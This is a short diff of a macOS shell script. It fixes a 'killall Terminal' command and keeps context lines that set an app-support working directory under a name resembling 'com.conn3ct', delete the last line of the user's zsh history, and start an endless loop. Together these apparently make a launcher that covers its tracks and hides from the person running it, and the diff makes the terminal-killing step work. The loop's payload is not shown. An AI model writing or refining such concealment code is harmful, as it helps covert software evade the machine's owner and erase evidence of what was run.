@@ -2,7 +2,7 @@
 
 work_dir="$HOME/Library/Application Support/com.conn3ct"
 
-killall terminal
+killall Terminal
 sed -i '' '$d' ~/.zsh_history
 
 while true; do
